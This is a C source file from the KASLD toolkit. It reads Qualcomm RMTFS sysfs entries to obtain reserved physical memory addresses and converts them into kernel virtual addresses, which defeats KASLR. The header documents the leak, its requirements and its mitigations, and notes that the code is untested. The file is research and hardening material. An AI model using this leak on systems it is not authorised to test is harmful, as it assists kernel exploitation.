// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read physical memory addresses from Qualcomm Remote Filesystem Memory
// (RMTFS) sysfs interface.
//
// The Qualcomm RMTFS driver allocates reserved physical RAM regions for
// modem/firmware remote filesystem usage and exposes their physical base
// addresses via sysfs:
//
//   /sys/class/rmtfs/qcom_rmtfs_memN/phys_addr  (physical base, %pa format)
//   /sys/class/rmtfs/qcom_rmtfs_memN/size        (region size, %pa format)
//
// Both attributes are created with DEVICE_ATTR(phys_addr, 0444, ...) —
// no capability check, world-readable. The %pa format specifier is NOT
// gated by kptr_restrict: it prints phys_addr_t values unconditionally.
//
// On ARM32 Qualcomm SoCs (Snapdragon MSM/APQ) without KASLR, the
// physical address directly yields a linear-map kernel virtual address:
//
//   arm32: va = phys + PAGE_OFFSET - PHYS_OFFSET
//
// On ARM64 without CONFIG_RANDOMIZE_MEMORY, the same applies via the
// linear map offset.
//
// Leak primitive:
//   Data leaked:      reserved physical DRAM address (rmtfs region)
//   Kernel subsystem: drivers/soc/qcom — /sys/class/rmtfs/*/phys_addr
//   Data structure:   struct qcom_rmtfs_mem → addr (phys_addr_t)
//   Address type:     physical (DRAM, reserved for modem)
//   Method:           parsed (sysfs text attribute)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable via DEVICE_ATTR 0444)
//   Source:
//   https://elixir.bootlin.com/linux/latest/source/drivers/soc/qcom/rmtfs_mem.c
//
// Mitigations:
//   CONFIG_QCOM_RMTFS_MEM=n removes the sysfs entries. Attribute
//   permissions could be tightened, but the kernel default is 0444.
//   On ARM64 with CONFIG_RANDOMIZE_MEMORY, physical addresses do not
//   directly reveal the virtual text base.
//
// Requires:
// - CONFIG_QCOM_RMTFS_MEM
// - At least one RMTFS memory region defined in device tree
//
// References:
// https://elixir.bootlin.com/linux/latest/source/drivers/soc/qcom/rmtfs_mem.c
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads reserved physical DRAM addresses from the Qualcomm RMTFS "
    "(Remote Filesystem Memory) sysfs interface at "
    "/sys/class/rmtfs/qcom_rmtfs_memN/phys_addr. The driver exposes "
    "each region's physical base address with world-readable (0444) "
    "DEVICE_ATTR attributes using the %pa format specifier, which is "
    "NOT gated by kptr_restrict. On ARM32/ARM64 Qualcomm systems with "
    "a fixed physical-to-virtual mapping, the address directly yields "
    "a linear-map kernel virtual address. Requires CONFIG_QCOM_RMTFS_MEM.");

// Untested: no Qualcomm RMTFS hardware available for testing.
KASLD_META("method:parsed\n"
           "addr:physical\n"
           "status:experimental\n"
           "config:CONFIG_QCOM_RMTFS_MEM\n");

static int read_file_line(const char *path, char *buf, size_t len) {
  FILE *f = fopen(path, "r");
  if (!f)
    return -1;
  if (fgets(buf, (int)len, f) == NULL) {
    fclose(f);
    return -1;
  }
  fclose(f);
  buf[strcspn(buf, "\n")] = '\0';
  return 0;
}

int main(void) {
  const char *base = "/sys/class/rmtfs";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[256];
  char label[128];
  int count = 0;

  fprintf(stderr,
          "[.] searching %s for RMTFS physical memory "
          "addresses ...\n",
          base);

  d = opendir(base);
  if (!d) {
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
    /* /sys/class/rmtfs absent if CONFIG_QCOM_RMTFS_MEM is not enabled */
    return KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    /* entries are named qcom_rmtfs_mem0, qcom_rmtfs_mem1, ... */
    if (strncmp(ent->d_name, "qcom_rmtfs_mem", 14) != 0)
      continue;

    snprintf(path, sizeof(path), "%s/%s/phys_addr", base, ent->d_name);

    if (read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    unsigned long long addr = 0;
    /* %pa outputs "0x<hex>" via special_hex_number (SPECIAL | SMALL | ZEROPAD)
     */
    if (sscanf(buf, "0x%llx", &addr) != 1)
      continue;

    if (!addr)
      continue;

    snprintf(label, sizeof(label), "sysfs_qcom_rmtfs_mem:%.20s", ent->d_name);

    fprintf(stderr, "[+] %s: phys = 0x%016llx\n", label, addr);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, (unsigned long)addr,
                 label);
    count++;

#if !PHYS_VIRT_DECOUPLED
    unsigned long virt = phys_to_virt((unsigned long)addr);
    fprintf(stderr, "[+] %s: directmap va = 0x%016lx\n", label, virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt, label);
#endif
  }
  closedir(d);

  if (!count) {
    fprintf(stderr, "[-] no RMTFS memory entries found in %s\n", base);
    return KASLD_EXIT_UNAVAILABLE;
  }

  return 0;
}
